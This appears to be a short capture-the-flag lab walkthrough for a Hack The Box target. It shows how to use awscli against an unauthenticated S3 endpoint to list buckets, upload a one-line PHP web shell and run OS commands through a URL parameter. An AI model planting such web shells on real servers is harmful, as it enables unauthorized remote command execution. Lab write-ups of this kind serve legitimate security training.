# AWS



## S3

We can interact with this S3 bucket with the aid of the 
command `apt install awscli`

First, we need to configure it using `aws configure`
We will be using an arbitrary value for all the fields, as sometimes the server is configured to not check authentication (still, it must be configured to something for aws to work).
```
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```





We can list all of the S3 buckets hosted by the server by using `ls`:
```
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

We can also use the `ls` command to list objects and common prefixes under the specified bucket.
```
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

### Copy files to a remote bucket. Example with a `php` payload:
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

We can confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php. Let us try executing the OS command `id` using the URL parameter `cmd`:
```
http://thetoppers.htb/shell.php?cmd=id
``` 






